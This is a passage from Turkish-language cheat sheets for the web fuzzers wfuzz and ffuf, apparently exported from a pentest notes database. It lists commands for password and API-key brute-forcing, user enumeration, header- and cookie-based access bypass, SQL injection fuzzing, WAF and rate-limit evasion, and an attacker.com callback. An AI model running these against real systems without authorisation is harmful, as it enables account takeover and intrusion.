gönderir.*\n```\nwfuzz -d "user=admin&pass=FUZZ" -z file,passwords.txt http://target.com/login\n```\n\n**`-H <header>`**\n*Custom HTTP header ekler.*\n```\nwfuzz -H "Authorization: Bearer TOKEN" -z file,wordlist.txt http://target.com/FUZZ\n```\n\n**`-b <cookie>`**\n*Cookie gönderir.*\n```\nwfuzz -b "session=abc123" -z file,wordlist.txt http://target.com/FUZZ\n```\n\n**`-t <threads>`**\n*Thread sayısını belirler (default: 10).*\n```\nwfuzz -t 20 -z file,wordlist.txt http://target.com/FUZZ\n```\n\n**`-s <seconds>`**\n*İstekler arasında delay (saniye).*\n```\nwfuzz -s 1 -z file,wordlist.txt http://target.com/FUZZ\n```\n\n**`-p <proxy>`**\n*Proxy server kullanır (IP:PORT:TYPE).*\n```\nwfuzz -p 127.0.0.1:8080:HTTP -z file,wordlist.txt http://target.com/FUZZ\n```\n\n**`--hc <codes>`**\n*Belirtilen HTTP status kodlarını gizler.*\n```\nwfuzz --hc 404,403 -z file,wordlist.txt http://target.com/FUZZ\n```\n\n**`--hl <lines>`**\n*Belirtilen satır sayısını gizler.*\n```\nwfuzz --hl 0 -z file,wordlist.txt http://target.com/FUZZ\n```\n\n**`--hh <chars>`**\n*Belirtilen karakter sayısını (response size) gizler.*\n```\nwfuzz --hh 5555 -z file,wordlist.txt http://target.com/FUZZ\n```\n\n**`--hw <words>`**\n*Belirtilen kelime sayısını gizler.*\n```\nwfuzz --hw 100 -z file,wordlist.txt http://target.com/FUZZ\n```\n\n**`--sc <codes>`**\n*Sadece belirtilen status kodlarını gösterir.*\n```\nwfuzz --sc 200,301,302 -z file,wordlist.txt http://target.com/FUZZ\n```\n\n**`--sl <lines>`**\n*Sadece belirtilen satır sayısını gösterir.*\n```\nwfuzz --sl 50 -z file,wordlist.txt http://target.com/FUZZ\n```\n\n**`--sh <chars>`**\n*Sadece belirtilen response size'ı gösterir.*\n```\nwfuzz --sh 1234 -z file,wordlist.txt http://target.com/FUZZ\n```\n\n**`--sw <words>`**\n*Sadece belirtilen kelime sayısını gösterir.*\n```\nwfuzz --sw 75 -z file,wordlist.txt http://target.com/FUZZ\n```\n\n**`-R <depth>`**\n*Recursive fuzzing derinliği.*\n```\nwfuzz -R 2 -z file,wordlist.txt http://target.com/FUZZ\n```\n\n**`-m <mode>`**\n*Çoklu payload modu (zip, chain, product).*\n```\nwfuzz -m zip -z file,w1.txt -z file,w2.txt http://target.com/FUZZ/FUZ2Z\n```\n\n**`--follow`**\n*HTTP redirect'leri takip eder.*\n```\nwfuzz --follow -z file,wordlist.txt http://target.com/FUZZ\n```\n\n**`--basic <user:pass>`**\n*HTTP Basic Authentication.*\n```\nwfuzz --basic admin:FUZZ -z file,passwords.txt http://target.com/\n```\n\n**`--ntlm <domain\\user:pass>`**\n*NTLM Authentication.*\n```\nwfuzz --ntlm "domain\\user:FUZZ" -z file,passwords.txt http://target.com/\n```\n\n**`--prefilter <filter>`**\n*Payload'a encoding/filter uygular.*\n```\nwfuzz --prefilter "urlencode" -z file,payloads.txt http://target.com/?q=FUZZ\n```\n\n**`-V`**\n*Verbose mode (detaylı çıktı).*\n```\nwfuzz -V -z file,wordlist.txt http://target.com/FUZZ\n```\n\n**`-o <format>`**\n*Output formatı (json, html, csv).*\n```\nwfuzz -o json -z file,wordlist.txt http://target.com/FUZZ\n```\n\n**`-f <filename>`**\n*Sonuçları dosyaya kaydet.*\n```\nwfuzz -f results.txt -z file,wordlist.txt http://target.com/FUZZ\n```\n\n**`--filter <expression>`**\n*Advanced filtering.*\n```\nwfuzz --filter "c=200 and l>100" -z file,wordlist.txt http://target.com/FUZZ\n```\n\n**`-X <method>`**\n*HTTP metodu belirt (GET, POST, PUT, DELETE, etc.).*\n```\nwfuzz -X POST -d "data=FUZZ" -z file,wordlist.txt http://target.com/api\n```\n\n## Açıklamalı Komutlar\n\n**Directory brute-force (temel):**\n```\nwfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/common.txt --hc 404 http://target.com/FUZZ\n```\n*-c: Renkli çıktı, -z: Wordlist source, --hc: 404'leri gizle, FUZZ: Payload yerleştirme noktası*\n\n**GET parametre fuzzing:**\n```\nwfuzz -c -z file,params.txt --hc 404,403 --hl 0 http://target.com/search?q=FUZZ\n```\n*--hl: 0 satırlı yanıtları gizle (boş response)*\n\n**POST login brute-force:**\n```\nwfuzz -c -z file,usernames.txt -z file,passwords.txt -d "username=FUZZ&password=FUZ2Z" --hc 200 --sc 302 http://target.com/login\n```\n*FUZZ/FUZ2Z: Çoklu payload, --hc: 200 gizle, --sc: Sadece 302 göster (redirect = başarılı login)*\n\n**Header injection:**\n```\nwfuzz -c -z file,payloads.txt -H "X-Forwarded-For: FUZZ" --sc 200 http://target.com/admin\n```\n*-H: Custom header, X-Forwarded-For: IP bypass için*\n\n**Cookie fuzzing:**\n```\nwfuzz -c -z range,0-1000 -b "user_id=FUZZ" --sc 200 --hh 5432 http://target.com/profile\n```\n*-z range: 0-1000 arası sayı, -b: Cookie, --hh: Belirli response size'ı gizle*\n\n**JSON API fuzzing:**\n```\nwfuzz -c -z file,ids.txt -H "Content-Type: application/json" -d '{"id":FUZZ}' --sc 200 http://target.com/api/user\n```\n*JSON body'de fuzzing, Content-Type header gerekli*\n\n**Subdomain brute-force:**\n```\nwfuzz -c -z file,subdomains.txt -H "Host: FUZZ.target.com" --hc 404,400 http://target.com\n```\n*Host header manipulation, wildcard detection için --hc kullan*\n\n**Proxy ile fuzzing:**\n```\nwfuzz -c -z file,wordlist.txt -p 127.0.0.1:8080:HTTP --hc 404 http://target.com/FUZZ\n```\n*-p: Burp proxy, tüm trafik Burp'ten geçer*\n\n**Multiple extension fuzzing:**\n```\nwfuzz -c -z file,filenames.txt -z list,php-txt-html-jsp http://target.com/FUZZ.FUZ2Z\n```\n*İki payload: filename + extension*\n\n**Auth bypass (Basic):**\n```\nwfuzz -c -z file,passwords.txt --basic admin:FUZZ --sc 200 http://target.com/secure\n```\n*HTTP Basic Auth brute-force*\n\n**Filtered fuzzing (advanced):**\n```\nwfuzz -c -z file,wordlist.txt --filter "c=200 and l>50 and w<100" http://target.com/FUZZ\n```\n*c=status code, l=lines, w=words; Complex filtering*\n\n**Recursive directory scan:**\n```\nwfuzz -c -z file,dirs.txt -R 3 --hc 404 http://target.com/FUZZ\n```\n*-R 3: 3 seviye derinliğe kadar recursive*\n\n**Rate-limited fuzzing:**\n```\nwfuzz -c -z file,wordlist.txt -t 5 -s 1 --hc 404,429 http://target.com/FUZZ\n```\n*-t 5: 5 thread, -s 1: 1 saniye delay, --hc 429: Rate-limit error'u gizle*\n\n**URL encoding fuzzing:**\n```\nwfuzz -c -z file,sqli-payloads.txt --prefilter "urlencode" --hc 404 http://target.com/search?q=FUZZ\n```\n*--prefilter: Payload'ları URL encode et*\n\n## Gerçek Pentest Senaryoları\n\n### Senaryo 1: Login Bypass - Parametre Fuzzing\n\n```\nwfuzz -c -z file,/usr/share/seclists/Usernames/top-usernames-shortlist.txt -z file,/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt -d "username=FUZZ&password=FUZ2Z&submit=Login" --hc 200 --sc 302 -t 20 http://target.com/login.php\n```\n*Başarılı login 302 redirect döner, başarısız 200 döner. --hc 200 ile failed login'leri gizle.*\n\n**Sonuç analizi:**\n```\n# Başarılı credential bulundu:\n000123:  302        0 L      0 W        0 Ch        "admin - password123"\n```\n\n### Senaryo 2: WAF Arkasında Endpoint Keşfi\n\n```\nwfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -H "User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1)" -H "X-Forwarded-For: 127.0.0.1" -t 10 -s 1 --hc 404,403 http://waf-protected.com/FUZZ\n```\n*Yavaş tarama (-t 10, -s 1), GoogleBot UA, X-Forwarded-For bypass*\n\n### Senaryo 3: API Endpoint Brute-Force\n\n```\nwfuzz -c -z file,api-endpoints.txt -z range,1-1000 -H "Authorization: Bearer eyJhbGc..." -H "Content-Type: application/json" --sc 200,201 http://api.target.com/v1/FUZZ/FUZ2Z\n```\n*REST API path + ID fuzzing, JWT authentication*\n\n**Örnek bulgu:**\n```\n000045:  200        15 L     45 W       823 Ch      "users - 42"\n```\n\n### Senaryo 4: Header-Based Auth Bypass (X-Forwarded-For)\n\n```\nwfuzz -c -z file,ips.txt -H "X-Forwarded-For: FUZZ" -H "X-Real-IP: FUZZ" --sc 200 --hc 403 http://target.com/admin\n```\n*IP whitelist bypass, localhost/internal IP fuzzing*\n\n**IP wordlist örneği:**\n```\n127.0.0.1\nlocalhost\n::1\n192.168.1.1\n10.0.0.1\n```\n\n### Senaryo 5: Cookie Manipülasyonu\n\n```\nwfuzz -c -z list,admin-moderator-user-guest -b "role=FUZZ; session=valid_token_here" --sc 200 --hh 1234 http://target.com/panel\n```\n*Role-based access control bypass, cookie değeri fuzzing*\n\n### Senaryo 6: POST/JSON Body Fuzzing\n\n```\nwfuzz -c -z file,sqli-payloads.txt -H "Content-Type: application/json" -d '{"search":"FUZZ","limit":10}' --hc 400,500 --filter "c=200 and l>100" http://target.com/api/search\n```\n*JSON body'de SQL injection, error-based filtering*\n\n### Senaryo 7: Büyük Wordlist - Performance Tuning\n\n```\nwfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -t 50 --hc 404 --hh 5555 -o json -f massive-scan.json http://target.com/FUZZ\n```\n*220k+ wordlist, 50 thread, JSON output, false-positive filtering*\n\n**Progress monitoring:**\n```\n# Terminal 2'de:\ntail -f massive-scan.json | grep -i "200"\n```\n\n### Senaryo 8: Vhost Brute-Force\n\n```\nwfuzz -c -z file,subdomains.txt -H "Host: FUZZ.target.com" --hc 404,400 --hw 100 --follow http://target.ip.address/\n```\n*Virtual host discovery, wildcard filtreleme*\n\n## Best Practices\n\n**1. Filtreleme Stratejileri:**\n\n**Baseline belirleme:**\n```\n# İlk test - geçersiz istek\ncurl -I http://target.com/nonexistent12345\n\n# Response: 404, 1234 bytes, 50 lines\n# Wfuzz filtreleme:\nwfuzz --hc 404 --hh 1234 --hl 50 ...\n```\n\n**Adaptive filtering:**\n```\n# İlk 10 sonuca bak\nwfuzz -c -z file,wordlist.txt http://target.com/FUZZ | head -20\n\n# Pattern belirle, sonra filtrele\nwfuzz -c -z file,wordlist.txt --hh 5555 --hl 42 http://target.com/FUZZ\n```\n\n**2. Yanlış Pozitif Azaltma:**\n\n**Wildcard detection:**\n```\n# Test isteği\ncurl http://target.com/definitelynonexistent12345678\n\n# Eğer 200 dönüyorsa wildcard var\n# Response size'a göre filtrele:\nwfuzz --hc 200 --hh <wildcard_size> ...\n```\n\n**Multiple filtering:**\n```\nwfuzz -c -z file,wordlist.txt --hc 404,403 --hl 0 --hw 50-60 http://target.com/FUZZ\n```\n\n**3. Hız/Performance Tuning:**\n\n**Thread optimizasyonu:**\n- Küçük wordlist (<1k): `-t 10-20`\n- Orta wordlist (1k-10k): `-t 20-30`\n- Büyük wordlist (>10k): `-t 30-50`\n- Rate-limited: `-t 5` + `-s 1`\n\n**Delay stratejisi:**\n```\n# WAF detection varsa\nwfuzz -t 5 -s 2 ...\n\n# Normal tarama\nwfuzz -t 30 ...\n```\n\n**4. Blind Endpoint Tespiti:**\n\n**Time-based detection:**\n```\nwfuzz -c -z file,payloads.txt --filter "t>5000" http://target.com/?q=FUZZ\n```\n*Response time > 5 saniye olanları göster (blind SQL/XXE)*\n\n**Response size anomaly:**\n```\nwfuzz -c -z file,wordlist.txt --filter "c=200 and (h<1000 or h>10000)" http://target.com/FUZZ\n```\n*Anormal response size'lar (çok küçük veya çok büyük)*\n\n**5. Payload Çeşitliliği:**\n\n**Multiple wordlist combo:**\n```\n# Özel + genel wordlist\ncat custom-endpoints.txt /usr/share/seclists/Discovery/Web-Content/common.txt > combined.txt\nwfuzz -z file,combined.txt http://target.com/FUZZ\n```\n\n**Payload transformation:**\n```\n# Case variations\nwfuzz -z file,words.txt --prefilter "upper" http://target.com/FUZZ\nwfuzz -z file,words.txt --prefilter "lower" http://target.com/FUZZ\n```\n\n**6. Output Management:**\n\n**Structured output:**\n```\nwfuzz -c -z file,wordlist.txt -o json -f results-$(date +%Y%m%d_%H%M).json http://target.com/FUZZ\n```\n\n**Real-time monitoring:**\n```\nwfuzz -c -z file,big-wordlist.txt http://target.com/FUZZ | tee live-results.txt\n```\n\n**7. Proxy Integration:**\n\n```\n# Tüm istekler Burp'ten geç\nwfuzz -c -z file,wordlist.txt -p 127.0.0.1:8080:HTTP http://target.com/FUZZ\n```\n\n**8. Multi-Stage Fuzzing:**\n\n```\n# Stage 1: Directory discovery\nwfuzz -c -z file,dirs.txt --hc 404 -o json -f dirs.json http://target.com/FUZZ\n\n# Stage 2: File fuzzing bulunan dizinlerde\ncat dirs.json | jq -r '.[] | select(.code==200) | .url' | while read dir; do\n  wfuzz -c -z file,files.txt --hc 404 $dir/FUZZ\ndone\n```\n\n## Sık Yapılan Hatalar\n\n**1. FUZZ marker eksikliği:**\n```\n# YANLIŞ\nwfuzz -c -z file,wordlist.txt http://target.com/admin\n\n# DOĞRU\nwfuzz -c -z file,wordlist.txt http://target.com/FUZZ\n```\n\n**2. Filtreleme yapmamak:**\n```\n# YANLIŞ (çok fazla noise)\nwfuzz -c -z file,wordlist.txt http://target.com/FUZZ\n\n# DOĞRU\nwfuzz -c -z file,wordlist.txt --hc 404,403 --hl 0 http://target.com/FUZZ\n```\n\n**3. Wildcard kontrolü yapmamak:**\n```\n# Test et\ncurl http://target.com/sdfgsdfgsdfg123456\n# Eğer 200 dönüyorsa wildcard var, --hh ile filtrele\n```\n\n**4. Thread aşırı kullanımı:**\n```\n# YANLIŞ (connection error, rate-limit)\nwfuzz -t 100 -z file,wordlist.txt http://target.com/FUZZ\n\n# DOĞRU\nwfuzz -t 20-30 -z file,wordlist.txt http://target.com/FUZZ\n```\n\n**5. POST data syntax hatası:**\n```\n# YANLIŞ\nwfuzz -d username=admin&password=FUZZ ...\n\n# DOĞRU (quotes kullan)\nwfuzz -d "username=admin&password=FUZZ" ...\n```\n\n**6. Multiple payload marker hatası:**\n```\n# YANLIŞ (2. payload için yanlış marker)\nwfuzz -z file,w1.txt -z file,w2.txt http://target.com/FUZZ/FUZZ\n\n# DOĞRU\nwfuzz -z file,w1.txt -z file,w2.txt http://target.com/FUZZ/FUZ2Z\n```\n\n**7. Header syntax hatası:**\n```\n# YANLIŞ\nwfuzz -H Authorization: Bearer TOKEN ...\n\n# DOĞRU\nwfuzz -H "Authorization: Bearer TOKEN" ...\n```\n\n**8. Output path izni:**\n```\n# YANLIŞ (permission denied)\nwfuzz -f /root/results.txt ...\n\n# DOĞRU\nwfuzz -f ~/results.txt ...\n```\n\n**9. Encoding unutmak:**\n```\n# YANLIŞ (SQLi payload'lar ham gönderilir)\nwfuzz -z file,sqli.txt http://target.com/?q=FUZZ\n\n# DOĞRU (URL encode)\nwfuzz -z file,sqli.txt --prefilter "urlencode" http://target.com/?q=FUZZ\n```\n\n**10. Baseline test yapmamak:**\n```\n# Her zaman önce test et:\ncurl -I http://target.com/definitelynonexistent\n# Response size, status code, line count'u not et\n# Sonra wfuzz'da filtrele\n```\n\n## Payload Types (-z seçenekleri)\n\n**file** - Dosyadan wordlist\n```\nwfuzz -z file,/path/wordlist.txt http://target.com/FUZZ\n```\n\n**list** - Inline list (virgülle ayrılmış)\n```\nwfuzz -z list,admin-root-test http://target.com/FUZZ\n```\n\n**range** - Sayı aralığı\n```\nwfuzz -z range,1-1000 http://target.com/user?id=FUZZ\n```\n\n**hexrange** - Hex aralığı\n```\nwfuzz -z hexrange,0x00-0xFF http://target.com/?param=FUZZ\n```\n\n**stdin** - STDIN'den al\n```\ncat wordlist.txt | wfuzz -z stdin http://target.com/FUZZ\n```\n\n**dirwalk** - Directory tree walk\n```\nwfuzz -z dirwalk,/path/to/dir http://target.com/FUZZ\n```\n\n## Filter Expressions\n\n**Status code:**\n```\n--filter "c=200"\n--filter "c!=404"\n--filter "c>=200 and c<300"\n```\n\n**Lines:**\n```\n--filter "l>50"\n--filter "l<100"\n```\n\n**Words:**\n```\n--filter "w=75"\n```\n\n**Chars (response size):**\n```\n--filter "h>1000"\n--filter "h!=5555"\n```\n\n**Time:**\n```\n--filter "t>5000"  # Response time > 5 sec\n```\n\n**Combination:**\n```\n--filter "c=200 and l>100 and h<10000"\n```\n\n## İpuçları\n\n**Wordlist konumları (Kali):**\n```\n/usr/share/seclists/Discovery/Web-Content/\n/usr/share/wordlists/dirb/\n/usr/share/wordlists/dirbuster/\n```\n\n**Output formatları:**\n```\n-o json    # JSON çıktı\n-o html    # HTML rapor\n-o csv     # CSV format\n-o raw     # Ham output\n```\n\n**Hızlı snippet'ler:**\n```\n# API key brute-force\nwfuzz -z file,keys.txt -H "X-API-Key: FUZZ" --sc 200 http://api.target.com/endpoint\n\n# User enumeration\nwfuzz -z file,users.txt -d "username=FUZZ" --hc 200 --sc 404 http://target.com/check-user\n\n# Backup file hunting\nwfuzz -z file,filenames.txt -z list,.bak-.old-.swp-.save http://target.com/FUZZ.FUZ2Z\n```\n	{wfuzz,fuzzing,web,brute-force,pentest}	{https://github.com/xmendez/wfuzz,https://wfuzz.readthedocs.io/}	192	2026-01-23 22:21:30.232	2026-01-23 22:21:30.232
615	Ffuf Cheatsheet	Ffuf Cheatsheet	# FFUF - Fuzz Faster U Fool\n\n## Temel Kullanım\n\n### Basit Directory Fuzzing\n\n**Directory brute-force:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt\n```\n\n**Multiple directories:**\n```\nffuf -u https://target.com/FUZZ/admin -w directories.txt\n```\n\n### Basit Parametre Fuzzing\n\n**GET parameter:**\n```\nffuf -u https://target.com/api?param=FUZZ -w values.txt\n```\n\n**Multiple parameters:**\n```\nffuf -u https://target.com/api?user=FUZZ&role=FUZ2Z -w users.txt:FUZZ -w roles.txt:FUZ2Z\n```\n\n### Wordlist Kullanımı\n\n**Single wordlist:**\n```\nffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt\n```\n\n**Multiple wordlists:**\n```\nffuf -u https://target.com/FUZZ/FUZ2Z -w dirs.txt:FUZZ -w files.txt:FUZ2Z\n```\n\n### Status Code Filtreleme\n\n**Match specific codes:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -mc 200,301,302\n```\n\n**Filter out codes:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -fc 404,403\n```\n\n### Response Size Filtreleme\n\n**Filter by size:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -fs 42\n```\n\n**Match by size:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -ms 1024-2048\n```\n\n### Timeout ve Concurrency\n\n**Set timeout:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -timeout 10\n```\n\n**Concurrency:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -t 50\n```\n\n**Rate limiting:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -rate 100\n```\n\n### Redirect Handling\n\n**Follow redirects:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -r\n```\n\n**Max redirect depth:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -r -maxredirs 3\n```\n\n### Output Kaydetme\n\n**JSON output:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -o results.json -of json\n```\n\n**CSV output:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -o results.csv -of csv\n```\n\n**HTML output:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -o results.html -of html\n```\n\n## İleri Seviye Kullanım\n\n### Recursion\n\n**Recursive fuzzing:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -recursion\n```\n\n**Recursion depth:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -recursion -recursion-depth 3\n```\n\n**Recursion strategy:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -recursion -recursion-strategy greedy\n```\n\n### Extended Matchers\n\n**Regex matcher:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -mr "admin|root|success"\n```\n\n**Word count matcher:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -mw 100-200\n```\n\n**Line count:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -ml 50\n```\n\n**Multiple matchers:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -mc 200 -ms 1000-5000 -mr "success"\n```\n\n### Rate Limiting Bypass\n\n**Slow rate:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -rate 10 -p 0.5\n```\n\n**Random delay:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -p 0.1-0.5\n```\n\n**Low threads:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -t 5 -p 1\n```\n\n### Header Fuzzing\n\n**Custom header:**\n```\nffuf -u https://target.com/api -w headers.txt -H "X-Custom: FUZZ"\n```\n\n**Authorization fuzzing:**\n```\nffuf -u https://target.com/api -w tokens.txt -H "Authorization: Bearer FUZZ"\n```\n\n**Multiple headers:**\n```\nffuf -u https://target.com/api -w values.txt -H "X-Header-1: FUZZ" -H "X-Header-2: FUZ2Z" -w values2.txt:FUZ2Z\n```\n\n**User-Agent fuzzing:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -H "User-Agent: FUZZ" -w user-agents.txt:FUZZ\n```\n\n### Subdomain Fuzzing (VHOST)\n\n**VHOST fuzzing:**\n```\nffuf -u https://target.com -w subdomains.txt -H "Host: FUZZ.target.com"\n```\n\n**DNS-based subdomain:**\n```\nffuf -u https://FUZZ.target.com -w subdomains.txt\n```\n\n**VHOST with filtering:**\n```\nffuf -u https://target.com -w subdomains.txt -H "Host: FUZZ.target.com" -fs 1234\n```\n\n### GET/POST/JSON Body Fuzzing\n\n**POST data:**\n```\nffuf -u https://target.com/login -w passwords.txt -X POST -d "username=admin&password=FUZZ"\n```\n\n**JSON body:**\n```\nffuf -u https://target.com/api -w values.txt -X POST -H "Content-Type: application/json" -d '{"key":"FUZZ"}'\n```\n\n**Multiple JSON params:**\n```\nffuf -u https://target.com/api -w users.txt:FUZZ -w ids.txt:FUZ2Z -X POST -d '{"user":"FUZZ","id":"FUZ2Z"}'\n```\n\n**PUT method:**\n```\nffuf -u https://target.com/api/FUZZ -w ids.txt -X PUT -d "value=test"\n```\n\n### Parameter Pollution Fuzzing\n\n**Multiple same param:**\n```\nffuf -u https://target.com/api?id=1&id=FUZZ -w values.txt\n```\n\n**Parameter injection:**\n```\nffuf -u https://target.com/api?param=value&FUZZ=test -w params.txt\n```\n\n### Blind Fuzzing\n\n**Time-based detection:**\n```\nffuf -u https://target.com/api?cmd=FUZZ -w payloads.txt -timeout 30 -ft 10\n```\n\n**Size variation:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -fs 42 -ac\n```\n\n**Auto-calibration:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -ac\n```\n\n### WAF Detection & Evasion\n\n**Random User-Agent:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -H "User-Agent: Mozilla/5.0..." -replay-proxy http://127.0.0.1:8080\n```\n\n**Case variation:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -ac -rate 10\n```\n\n**Encoding:**\n```\nffuf -u https://target.com/%46%55%5a%5a -w wordlist.txt\n```\n\n### Burp Collaborator Benzeri Dış Çağrı Tespiti\n\n**DNS callback:**\n```\nffuf -u https://target.com/api?url=http://FUZZ.burpcollaborator.net -w payloads.txt\n```\n\n**HTTP callback:**\n```\nffuf -u https://target.com/api?callback=http://attacker.com/FUZZ -w ids.txt\n```\n\n### Varying Thread Strategies\n\n**Low threads (stealth):**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -t 5\n```\n\n**High threads (fast):**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -t 200\n```\n\n**Adaptive threads:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -t 50 -rate 100\n```\n\n### Payload Encoding\n\n**URL encoding:**\n```\nffuf -u https://target.com/api?param=%46%55%5a%5a -w payloads.txt\n```\n\n**Base64:**\n```\n# Pre-encode wordlist\ncat payloads.txt | base64 > encoded.txt\nffuf -u https://target.com/api?data=FUZZ -w encoded.txt\n```\n\n### Multi-Wordlist (Mode)\n\n**Clusterbomb (all combinations):**\n```\nffuf -u https://target.com/FUZZ/FUZ2Z -w dirs.txt:FUZZ -w files.txt:FUZ2Z -mode clusterbomb\n```\n\n**Pitchfork (parallel iteration):**\n```\nffuf -u https://target.com/user/FUZZ/file/FUZ2Z -w users.txt:FUZZ -w files.txt:FUZ2Z -mode pitchfork\n```\n\n### FUZZ Keyword Kullanım Pratikleri\n\n**Path fuzzing:**\n```\nffuf -u https://target.com/FUZZ\n```\n\n**Extension fuzzing:**\n```\nffuf -u https://target.com/adminFUZZ -w extensions.txt\n```\n\n**Multiple keywords:**\n```\nffuf -u https://FUZZ.target.com/FUZ2Z -w subdomains.txt:FUZZ -w paths.txt:FUZ2Z\n```\n\n**Query param:**\n```\nffuf -u https://target.com/?FUZZ=value -w params.txt\n```\n\n### Proxy Kullanımı\n\n**Burp Suite:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -x http://127.0.0.1:8080\n```\n\n**SOCKS proxy:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -x socks5://127.0.0.1:9050\n```\n\n**Replay proxy:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -replay-proxy http://127.0.0.1:8080\n```\n\n**TOR:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -x socks5://127.0.0.1:9050\n```\n\n## Argument Referansı\n\n### Temel Argümanlar\n\n**`-u <url>`**\n*Hedef URL.*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt\n```\n\n**`-w <wordlist>`**\n*Wordlist dosyası.*\n```\nffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt\n```\n\n**`-H <header>`**\n*Custom header.*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -H "Authorization: Bearer token"\n```\n\n**`-X <method>`**\n*HTTP method (GET, POST, PUT, DELETE).*\n```\nffuf -u https://target.com/api -w data.txt -X POST\n```\n\n**`-d <data>`**\n*POST data payload.*\n```\nffuf -u https://target.com/login -w passwords.txt -X POST -d "user=admin&pass=FUZZ"\n```\n\n**`-mr <regex>`**\n*Regex matcher.*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -mr "admin|success"\n```\n\n**`-fs <size>`**\n*Filter by response size.*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -fs 42\n```\n\n**`-fc <codes>`**\n*Filter by status code.*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -fc 404,403\n```\n\n**`-mc <codes>`**\n*Match status code.*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -mc 200,301\n```\n\n**`-c`**\n*Colorized output.*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -c\n```\n\n**`-t <threads>`**\n*Concurrency (threads).*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -t 50\n```\n\n**`-timeout <sec>`**\n*Timeout per request (seconds).*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -timeout 10\n```\n\n**`-o <file>`**\n*Output file.*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -o results.json\n```\n\n**`-of <format>`**\n*Output format (json, csv, html, md, ecsv).*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -o results.json -of json\n```\n\n**`--json`**\n*JSON output (alias for -of json).*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -o results.json --json\n```\n\n### Fuzzing Argümanları\n\n**`FUZZ`**\n*Primary fuzzing keyword.*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt\n```\n\n**`FUZ2Z, FUZ3Z, etc.`**\n*Multiple fuzzing keywords.*\n```\nffuf -u https://target.com/FUZZ/FUZ2Z -w dirs.txt:FUZZ -w files.txt:FUZ2Z\n```\n\n**`-request <file>`**\n*Raw HTTP request from file.*\n```\nffuf -request request.txt -w wordlist.txt\n```\n\n**`-mode <mode>`**\n*Fuzzing mode (clusterbomb, pitchfork).*\n```\nffuf -u https://target.com/FUZZ/FUZ2Z -w w1.txt:FUZZ -w w2.txt:FUZ2Z -mode clusterbomb\n```\n\n### Performans Argümanları\n\n**`-rate <n>`**\n*Requests per second.*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -rate 100\n```\n\n**`-p <seconds>`**\n*Delay between requests (can be range: 0.1-0.5).*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -p 0.5\n```\n\n**`-x <proxy>`**\n*Proxy URL.*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -x http://127.0.0.1:8080\n```\n\n**`--delay <seconds>`**\n*Alias for -p.*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt --delay 1\n```\n\n### Recursion Argümanları\n\n**`-recursion`**\n*Enable recursive fuzzing.*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -recursion\n```\n\n**`-recursion-depth <n>`**\n*Maximum recursion depth.*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -recursion -recursion-depth 2\n```\n\n**`-recursion-strategy <strategy>`**\n*Recursion strategy (default, greedy).*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -recursion -recursion-strategy greedy\n```\n\n### Matchers & Filters\n\n**`-mc <codes>`**\n*Match HTTP status codes.*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -mc 200,301,302\n```\n\n**`-ms <size>`**\n*Match response size (bytes or range).*\n```\nffuf -u 